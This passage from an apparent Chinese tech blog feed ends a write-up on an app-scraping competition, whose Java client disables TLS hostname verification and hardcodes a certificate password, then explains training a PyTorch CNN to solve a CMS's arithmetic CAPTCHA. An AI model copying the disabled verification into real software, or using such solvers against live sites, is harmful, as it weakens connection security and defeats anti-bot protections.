class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">appmatch05</span><span class="params">(String url, <span class="keyword">int</span> page)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">  </span><br><span class="line">        String result = <span class="keyword">null</span>;  </span><br><span class="line">  </span><br><span class="line">        InputStream[] insCerArry = <span class="keyword">new</span> InputStream[]&#123;&#125;;  </span><br><span class="line">        InputStream insJksDir = <span class="keyword">new</span> FileInputStream(<span class="string">"file/cer/clientCA.bks"</span>);  </span><br><span class="line">  </span><br><span class="line">        HttpsUtils.SSLParams sslParams = HttpsUtils.getSslSocketFactory(insCerArry, insJksDir, <span class="string">"MZ4cozY8Qu32UzGe"</span>);  </span><br><span class="line">  </span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">                .hostnameVerifier(<span class="keyword">new</span> HostnameVerifier()  </span><br><span class="line">                &#123;  </span><br><span class="line">                    <span class="meta">@Override</span>  </span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span>  </span></span><br><span class="line"><span class="function">                    </span>&#123;  </span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">true</span>;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;)  </span><br><span class="line">                .sslSocketFactory(sslParams.sSLSocketFactory, sslParams.trustManager)  </span><br><span class="line">                .build();  </span><br><span class="line">          </span><br><span class="line">        RequestBody formBody = <span class="keyword">new</span> FormBody.Builder()  </span><br><span class="line">                .add(<span class="string">"page"</span>, page + <span class="string">""</span>)  </span><br><span class="line">                .build(); <span class="comment">// 表单键值对  </span></span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder().url(url).post(formBody).build(); <span class="comment">// 请求  </span></span><br><span class="line">        Response response = okHttpClient.newCall(request).execute();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (response.isSuccessful()) &#123;  </span><br><span class="line">            result = response.body().string();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> result;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>HttpsUtils网上搜索一个抄下来就可以用了。请求第一页数据：<br><img src="YRX-29.png" alt="YRX-29.png"><br>需要注意使用的java版本，使用jdk1.8.0_111时，就会爆下面的错误：<br><img src="YRX-30.png" alt="YRX-30.png"><br>当时比赛的时候用的jdk1.8.0_111，一直报错，导致找了好多关于双向证书的代码都不行，在比赛结束后，换了jdk版本同样的代码，立即就好了。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>本文主要是通过一次APP爬虫的比赛，一方面提供了对于Android 7 及以上系统抓包的一种思路，二是unidbg的初级使用，还有就是双向证书的问题。对于其他grpc、quic、tls等，还需要更深入的学习。另外还要感谢王老板提供这次学习的机会。</p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p>[1] unidbg:<a href="https://github.com/zhkl0228/unidbg" target="_blank" rel="noopener">https://github.com/zhkl0228/unidbg</a><br>[2] objection:<a href="https://github.com/sensepost/objection/wiki/Patching-Android-Applications" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Patching-Android-Applications</a><br>[3] 比赛地址:<a href="http://appmatch.yuanrenxue.com/" target="_blank" rel="noopener">http://appmatch.yuanrenxue.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> APP逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 猿人学 </tag>
            
            <tag> unidbg </tag>
            
            <tag> objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单计算验证码的识别过程</title>
      <link href="/2022/01/19/Calculate-Captcha-Recognition/"/>
      <url>/2022/01/19/Calculate-Captcha-Recognition/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h2><p>某CMS的验证码是简单的计算验证码，都是一位数的加减乘除运算，之前尝试用分割的方法识别，但成功率较低。后来采用了pytorch训练后进行识别，可以达到98%以上的识别率，于是整理一下过程，水一篇文章。</p><a id="more"></a><h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先是验证码的获取，由于爬取验证码还要手工标注，比较麻烦，这里可以通过修改程序来批量生成标注好的样本。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.code.kaptcha.Producer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenCalculateCaptcha</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Producer kaptcha = <span class="keyword">new</span> CaptchaConfig().getKaptchaBeanMath();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            String capText = kaptcha.createText();</span><br><span class="line">            String capStr = capText.substring(<span class="number">0</span>, capText.lastIndexOf(<span class="string">"@"</span>));</span><br><span class="line">            System.out.println(capStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">6-1&#x3D;?</span><br><span class="line">9+1&#x3D;?</span><br><span class="line">0+5&#x3D;?</span><br><span class="line">8*6&#x3D;?</span><br><span class="line">6&#x2F;1&#x3D;?</span><br><span class="line">5+7&#x3D;?</span><br><span class="line">9+3&#x3D;?</span><br><span class="line">0&#x2F;5&#x3D;?</span><br><span class="line">1*2&#x3D;?</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过执行的结果可以发现，生成的验证码中会出现<code>*</code>、<code>/</code>、<code>?</code>等字符，这些字符在作为文件名时不合法，所以需要进行替换。</p><p>例如将除号<code>/</code>替换为<code>÷</code>，乘号<code>*</code>替换为<code>×</code>，问号<code>?</code>替换为<code>？</code>。</p><p>同时为了避免生成的验证码重复，生成的文件名拼接了时间戳的md5，并用<code>_</code>连接。</p><p>替换的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String newCapStr = capStr.replace(<span class="string">"/"</span>,<span class="string">"÷"</span>).replace(<span class="string">"*"</span>,<span class="string">"×"</span>).replace(<span class="string">"?"</span>,<span class="string">"？"</span>) + <span class="string">"_"</span> + DigestUtils.md5Hex(<span class="string">""</span>+System.currentTimeMillis())+<span class="string">".jpg"</span>;</span><br></pre></td></tr></table></figure><p>再次执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">8×4&#x3D;？_b69426246067db177639de42b77082ab.jpg</span><br><span class="line">3÷1&#x3D;？_d0ad2c5c50b4d8db2736093bdf2c08e8.jpg</span><br><span class="line">6÷3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">3×8&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">9-3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">2-0&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">0+9&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">4-1&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">6+2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">7×2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后就是验证码图片的保存。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BufferedImage bi = DefaultKaptcha.createImage(capStr);</span><br><span class="line">String fileName = dir.getPath()+File.separator+capStr.replace(<span class="string">"/"</span>,<span class="string">"÷"</span>).replace(<span class="string">"*"</span>,<span class="string">"×"</span>).replace(<span class="string">"?"</span>,<span class="string">"？"</span>) + <span class="string">"_"</span> + DigestUtils.md5Hex(<span class="string">""</span>+System.currentTimeMillis())+<span class="string">".jpg"</span>;</span><br><span class="line">ImageIO.write(bi, <span class="string">"jpg"</span>, <span class="keyword">new</span> File(fileName));</span><br></pre></td></tr></table></figure><p>生成的验证码如下：</p><p><img src="2%C3%B71=%EF%BC%9F_c893df08dbb80e70e26b7e352af0d4a4.jpg" alt="2/1=?"></p><p><img src="3%C3%975=%EF%BC%9F_44385059acbc138515e324c8e08af20c.jpg" alt="3*5=?"></p><p>到此获取标注好的验证码已经完成了，下面就开始进行验证码的识别。</p><h2 id="0x02-验证码的识别"><a href="#0x02-验证码的识别" class="headerlink" title="0x02  验证码的识别"></a>0x02  验证码的识别</h2><h3 id="1-分割识别"><a href="#1-分割识别" class="headerlink" title="1.分割识别"></a>1.分割识别</h3><p>最早是根据文章《<a href="https://guanqr.com/tech/computer/shangxueba-crack/" target="_blank" rel="noopener">自动识别验证码破解上学吧题目答案</a>》中的方法来进行验证码的识别，但是由于验证码不太规则，导致识别效果较差，后面就放弃了。这里列出简要过程。</p><p>验证码图片为 60×160 像素的，两个数字的范围都是 0 到 9。对图片转成灰度图后并进行分割。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">image &#x3D; Image.open(path).convert(&quot;L&quot;)</span><br><span class="line">cropped_image1 &#x3D; image.crop((25, 13, 50, 44))  # 第一个数字的切图</span><br><span class="line">cropped_image2 &#x3D; image.crop((65, 13, 90, 44))  # 第二个数字的切图</span><br></pre></td></tr></table></figure><blockquote><p>可以自己找比较合适的分割位置。</p></blockquote><p>分割的效果：</p><p><img src="image_corp.png" alt="分割"></p><p>然后进行二值化，遍历灰度图的像素点，这里以阈值66为界限，使得图片的像素点要么为纯黑 0，要么为纯白 255，下图是二值化之后的图片：</p><p><img src="binarizing.png" alt="二值化"></p><p>接着对验证码样本进行批量切图、转灰度图、二值化：</p><p>批量对图片进行分割，然后保存格式为<code>数字_md5(时间戳).jpg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">corpImg</span><span class="params">(name)</span>:</span></span><br><span class="line">    imgPath = <span class="string">"MathCodes/"</span> + name</span><br><span class="line">    fname = name[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">    img = cv2.imread(imgPath, <span class="number">0</span>)  <span class="comment"># 直接读为灰度图像</span></span><br><span class="line">    img1 = img[<span class="number">13</span>:<span class="number">44</span>, <span class="number">28</span>:<span class="number">52</span>] <span class="comment">#分割</span></span><br><span class="line">    cv2.imwrite(fname+<span class="string">"_"</span>+getMd5()+<span class="string">".jpg"</span>, img1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    names = os.listdir(<span class="string">"MathCodes"</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        corpImg(name)</span><br></pre></td></tr></table></figure><p><img src="corpImages.png" alt="切图"></p><p>从中挑选出噪点去除效果最好图片的作为模板，0 到 9 这 10 个数字各一个。</p><p><img src="templets.png" alt="模板"></p><p>分别遍历这几个模板图片的像素点并存为 0-1 矩阵：首先创建一个 24列 31 行的二维数组（所有元素都为 0），遇到黑色像素点就将 0 变成 1，此处需要注意二维数组中坐标与像素点坐标是相反的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num_info = [([<span class="number">0</span>] * <span class="number">24</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>)]  <span class="comment"># 创建一个宽度为24，高度为31的二维数组</span></span><br><span class="line">pixdata = img.load()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(x, y)</span></span><br><span class="line">            num_info[y][x] = <span class="number">1</span>  <span class="comment"># 注意二维数组中坐标是相反的</span></span><br><span class="line">num_info_list.append(num_info)</span><br></pre></td></tr></table></figure><p>接下来就是识别了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">num_info_list = []  <span class="comment"># 这个数组用以存储全部数字的 0-1 矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    filename = <span class="string">'temp/'</span>+str(i) + <span class="string">'.png'</span></span><br><span class="line">    img = Image.open(filename)</span><br><span class="line"></span><br><span class="line">    num_info = [([<span class="number">0</span>] * <span class="number">24</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>)]  <span class="comment"># 创建一个宽度为24，高度为31的二维数组</span></span><br><span class="line">    pixdata = img.load()</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># print(x, y)</span></span><br><span class="line">                num_info[y][x] = <span class="number">1</span>  <span class="comment"># 注意二维数组中坐标是相反的</span></span><br><span class="line">    num_info_list.append(num_info)</span><br><span class="line">img = Image.open(<span class="string">'temp/067_1.jpg'</span>)</span><br><span class="line">img = binarizing(img,<span class="number">66</span>)</span><br><span class="line">img.save(<span class="string">"temp/01111.png"</span>)</span><br><span class="line">count_list = [] <span class="comment"># 记录当前图片像素信息与每一个 0-1 序列的匹配程度</span></span><br><span class="line"></span><br><span class="line">pixdata = img.load()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span> <span class="keyword">and</span> num_info_list[i][y][x] == <span class="number">1</span>: <span class="comment"># 图片中黑色像素点出现的位置对应的矩阵点也是 1</span></span><br><span class="line">                count = count + <span class="number">1</span></span><br><span class="line">    count_list.append(count)</span><br><span class="line"></span><br><span class="line">print(count_list)</span><br><span class="line">print(<span class="string">'当前图片的识别结果：'</span> + str(count_list.index(max(count_list)))) <span class="comment"># 找到匹配数最大的那个元素的序号，而序号和数字是相同的。</span></span><br></pre></td></tr></table></figure><p><img src="corp_recogn_result.png" alt="分割识别"></p><p>从上面来看识别效果不是太好，所以后面就放弃了这种方法。</p><blockquote><p>也可以先分割验证码，之后用ddddocr进行识别，中间的运算符可以采用上述的方法进行识别。这里就说一个思路，不具体实现了。一来比较麻烦，二来是运算符处理的效果也不会太好，但最终的结果会比直接分割识别这种方法好。</p></blockquote><p>这是ddddocr识别效果，有一个没识别出来，不过准确率还挺高。</p><p><img src="ddddocr_recogn_result.png" alt="ddddocr识别"></p><p>接下来就使用pytorch进行训练。</p><h3 id="2-pytorch识别"><a href="#2-pytorch识别" class="headerlink" title="2.pytorch识别"></a>2.pytorch识别</h3><p>pytorch训练验证码的过程都差不多，这里从网上找了一套修改了一下。</p><p>样本已经有了，首先对验证码进行分析。验证码字符一共有16种，分别为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789+-×÷&#x3D;？</span><br></pre></td></tr></table></figure><p>验证码长度为5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">captcha_array &#x3D; list(&quot;0123456789+-×÷&#x3D;？&quot;)</span><br><span class="line">captcha_size &#x3D; 5</span><br></pre></td></tr></table></figure><p>接下来就是Datasets数据加载。</p><p>pytorch有非常方便高效的数据加载模块<code>Dataset</code>和<code>DataLoader</code>。<br>Dataset是数据样本的封装，可以很方便的读取数据。</p><p>实现一个Dataset的子类，需要重写<code>__len__</code>和<code>__getitem__</code>方法，<code>__len__</code>需要返回整个数据集的大小，<code>__getitem__</code>提供一个整数索引参数，返回一个样本数据（一个图片张量和一个标签张量）。主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDataset</span><span class="params">(Dataset)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, root_dir)</span>:</span></span><br><span class="line">        super(MyDataset, self).__init__()</span><br><span class="line">        self.image_path = [os.path.join(root_dir, image_name) <span class="keyword">for</span> image_name <span class="keyword">in</span> os.listdir(root_dir)]</span><br><span class="line">        self.transforms = transforms.Compose(</span><br><span class="line">            [</span><br><span class="line">                transforms.ToTensor(),</span><br><span class="line">                transforms.Resize((<span class="number">60</span>, <span class="number">160</span>)),</span><br><span class="line">                transforms.Grayscale()  <span class="comment"># 灰色</span></span><br><span class="line">            ]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.image_path.__len__()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        image_path = self.image_path[index]</span><br><span class="line">        <span class="comment"># print(image_path)</span></span><br><span class="line">        image = self.transforms(Image.open(image_path))</span><br><span class="line">        ll = image_path.split(<span class="string">"/"</span>)[<span class="number">-1</span>]</span><br><span class="line">        ll = ll.split(<span class="string">"_"</span>)[<span class="number">0</span>] <span class="comment">#验证码文本</span></span><br><span class="line">        label_tensor = one_hot.text2Vec(ll)  <span class="comment"># [5,16]</span></span><br><span class="line">        label_tensor = label_tensor.view(<span class="number">1</span>, <span class="number">-1</span>)[<span class="number">0</span>]  <span class="comment"># [5*16]</span></span><br><span class="line">        <span class="comment"># print(label)</span></span><br><span class="line">        <span class="keyword">return</span> image, label_tensor</span><br></pre></td></tr></table></figure><p>其中<code>text2Vec</code>是将验证码进行onehot编码，这里是变成一个5*16的数组。</p><p>主要代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2Vec</span><span class="params">(text)</span>:</span></span><br><span class="line">    vec = torch.zeros(common.captcha_size, len(common.captcha_array))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        vec[i, common.captcha_array.index(text[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> vec</span><br></pre></td></tr></table></figure><p>比如说<code>0×4=？</code>转换的结果就如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 0</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0., 0., 0.], # ×</span><br><span class="line">        [0., 0., 0., 0., 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 4</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0.], # &#x3D;</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1.]]) # ？</span><br></pre></td></tr></table></figure><p>对应的还原方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vec2Text</span><span class="params">(vec)</span>:</span></span><br><span class="line">    vec = torch.argmax(vec, dim=<span class="number">1</span>)  <span class="comment"># 取最大值，不是0的取出来</span></span><br><span class="line">    text = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vec:</span><br><span class="line">        text += common.captcha_array[i]</span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure><p>DataLoader是Dataset的进一步封装，Dataset每次通过<code>__getitem__</code>方法取到的是一个样本，经过DataLoader封装为dataloader后，每次取的是一个batch大小的样本批次。</p><p>主要代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform = transforms.Compose([transforms.ToTensor()])  <span class="comment"># 不做数据增强和标准化了</span></span><br><span class="line">train_dataset = CaptchaData(<span class="string">'./datasets/train/'</span>, transform=transform)</span><br><span class="line">train_data_loader = DataLoader(train_dataset, batch_size=<span class="number">32</span>, num_workers=<span class="number">0</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">test_data = CaptchaData(<span class="string">'./datasets/test/'</span>, transform=transform)</span><br><span class="line">test_data_loader = DataLoader(test_data, batch_size=<span class="number">128</span>, num_workers=<span class="number">0</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p><code>transforms</code>是数据预处理操作，一般数据增强就通过transform实现，可以随机亮度，随机翻转，随机缩放等等。此处只使用了<code>ToTensor()</code>，将<code>PIL.Image</code>对象转换成Tensor。</p></blockquote><p>训练采用了CNN神经网络，CNN主要由卷积层，池化层，激活函数组成，再加上一个BatchNorm，BatchNorm叫做批规范化，可以加速模型的收敛速度。</p><p>模型的主要代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 第一层神经网络</span></span><br><span class="line">        <span class="comment"># nn.Sequential: 将里面的模块依次加入到神经网络中</span></span><br><span class="line">        self.layer1 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>),  <span class="comment"># 3通道变成16通道，图片：60*160</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">16</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第2层神经网络</span></span><br><span class="line">        self.layer2 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">16</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>),  <span class="comment"># 16通道变成64通道，图片：30*80</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第3层神经网络</span></span><br><span class="line">        self.layer3 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, kernel_size=<span class="number">3</span>),  <span class="comment"># 64通道变成128通道，图片：14*39</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第4层神经网络</span></span><br><span class="line">        self.fc1 = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">13824</span>, <span class="number">1024</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.2</span>),  <span class="comment"># drop 20% of the neuron</span></span><br><span class="line">            nn.ReLU()</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第5层神经网络</span></span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">1024</span>, common.captcha_size * common.captcha_array.__len__())  <span class="comment"># 5:验证码的长度， 16: 字母列表的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前向传播</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = x.to(device)</span><br><span class="line">        x = self.layer1(x)</span><br><span class="line">        x = self.layer2(x)</span><br><span class="line">        x = self.layer3(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        x = 